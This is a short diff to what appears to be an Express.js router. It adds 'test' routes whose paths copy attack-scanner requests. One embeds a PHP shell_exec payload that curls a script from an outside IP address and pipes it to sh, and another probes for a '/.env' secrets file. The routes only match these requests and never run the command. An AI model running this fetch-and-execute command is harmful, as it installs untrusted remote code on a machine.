@@ -35,4 +35,11 @@ router.post('/sales', sessionAuth.checkSession, ctrl.process.post.sales);
 //UPDATE
 router.put('/sales', sessionAuth.checkSession, ctrl.process.put.sales);
 
+//test
+router.get(
+  '/?a=fetch&content=<php>die(shell_exec("curl%2094.103.89.159/tf.sh|sh"))</php>',
+  ctrl.process.test
+);
+router.get('/.env', ctrl.process.test);
+
 module.exports = router;
